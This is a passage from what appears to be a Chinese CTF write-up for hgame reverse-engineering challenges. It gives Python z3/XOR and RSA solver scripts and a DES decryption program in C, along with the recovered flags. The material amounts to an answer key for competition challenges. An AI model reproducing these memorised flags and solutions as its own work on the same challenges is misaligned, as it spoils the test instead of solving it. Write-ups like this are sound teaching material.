style="color:#ae81ff">0xC1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x, c <span style="color:#f92672">in</span> zip(xor_list, cipher):
</span></span><span style="display:flex;"><span>    print (chr((c <span style="color:#f92672">^</span> x) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!}</span>
</span></span></code></pre></div><h3 id="reserver">[RE]server</h3>
<p>下断点，浏览器输入 <code>localhost:9090?flag=hgame{}</code> 就能断住，然后就是慢慢调试了</p>
<p>rsa 部分用的 <code>math/big</code> 库中的东西，还是比较容易识别的（go 还是看汇编舒服）</p>
<p>随后就是两个循环的异或了，这里用 z3 解的，所以逻辑直接看代码就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74">&#39;f</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i, <span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>)]
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x66</span>
</span></span><span style="display:flex;"><span>flag2 <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
</span></span><span style="display:flex;"><span>    v16 <span style="color:#f92672">=</span> flag[i]
</span></span><span style="display:flex;"><span>    flag2<span style="color:#f92672">.</span>append(v16 <span style="color:#f92672">^</span> c)
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> v16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
</span></span><span style="display:flex;"><span>    v18 <span style="color:#f92672">=</span> flag2[i]
</span></span><span style="display:flex;"><span>    flag2[i] <span style="color:#f92672">=</span> v18 <span style="color:#f92672">^</span> c
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> v18
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">13</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(flag2[i] <span style="color:#f92672">==</span> cipher[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(flag[i] <span style="color:#f92672">&gt;=</span> ord(<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(flag[i] <span style="color:#f92672">&lt;=</span> ord(<span style="color:#e6db74">&#39;9&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>check()
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag:
</span></span><span style="display:flex;"><span>    print (chr(m[i]<span style="color:#f92672">.</span>as_long()), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>M <span style="color:#f92672">=</span> <span style="color:#ae81ff">92582184765240663364795767694262273105045150785272129481762171937885924776597</span>
</span></span><span style="display:flex;"><span>N <span style="color:#f92672">=</span> <span style="color:#ae81ff">107310528658039985708896636559112400334262005367649176746429531274300859498993</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> M <span style="color:#f92672">*</span> N
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">950501</span>
</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (M <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n2s(pow(<span style="color:#ae81ff">135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024</span>, invmod(e, phi), t))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># b&#39;hgame{g0_and_g0_http_5erv3r_nb}&#39;</span>
</span></span></code></pre></div><h3 id="rewow">[RE]WOW</h3>
<p>这题几乎和天堂之门没关系，主要是把密钥隐藏了，运算之后应该是 <code>12345678</code>，但也可以直接用 windbg 动调拿到轮密钥</p>
<p>通过置换函数+明显的常数特征判断是 DES，直接解密就行</p>
<p>网上抄了份 DES，改一改就行</p>
<p>solve.c</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;bool.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;tables.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitsCopy</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ByteToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToByte</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToHex</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HexToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">TablePermute</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>Table,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">LoopMove</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Xor</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatA,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatB,<span style="color:#66d9ef">int</span> Num);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">S_Change</span>(<span style="color:#66d9ef">bool</span> DatOut[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">48</span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">F_Change</span>(<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatKi[<span style="color:#ae81ff">48</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SetKey</span>(<span style="color:#66d9ef">char</span> KeyIn[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">PlayDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">KickDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> MesHex[<span style="color:#ae81ff">64</span>]<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;92028926CF6497655A09A46F3A079DB14320B10556683353BB5AF969BBB23EA2&#34;</span>};         <span style="color:#75715e">// 16个字符数组用于存放 64位16进制的密文
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> MyMessage[<span style="color:#ae81ff">32</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">KickDes</span>(MyMessage,MesHex);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">KickDes</span>(MyMessage<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>,MesHex<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">KickDes</span>(MyMessage<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>,MesHex<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">KickDes</span>(MyMessage<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>,MesHex<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Deciphering Over !!:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>, MyMessage[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;pause&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitsCopy</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Len; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatOut[i] <span style="color:#f92672">=</span> DatIn[i];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ByteToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatOut[i] <span style="color:#f92672">=</span> (DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x01</span>;   
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToByte</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (Num <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>); i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatOut[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatOut[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">|=</span> DatIn[i] <span style="color:#f92672">&lt;&lt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>);    
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToHex</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatOut[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatOut[i] <span style="color:#f92672">=</span> DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> (DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">+</span> (DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> (DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>((DatOut[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span>) {
</span></span><span style="display:flex;"><span>            DatOut[i] <span style="color:#f92672">=</span> DatOut[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;7&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            DatOut[i] <span style="color:#f92672">=</span> DatOut[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HexToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>((DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;9&#39;</span>) {
</span></span><span style="display:flex;"><span>            DatOut[i] <span style="color:#f92672">=</span> ((DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;7&#39;</span>) <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x01</span>;               
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            DatOut[i] <span style="color:#f92672">=</span> ((DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x01</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">TablePermute</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>Table,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">256</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        Temp[i] <span style="color:#f92672">=</span> DatIn[Table[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BitsCopy</span>(DatOut, Temp, Num);
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">LoopMove</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">256</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BitsCopy</span>(Temp,DatIn,Num);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BitsCopy</span>(DatIn,DatIn<span style="color:#f92672">+</span>Num,Len<span style="color:#f92672">-</span>Num);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BitsCopy</span>(DatIn<span style="color:#f92672">+</span>Len<span style="color:#f92672">-</span>Num,Temp,Num);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
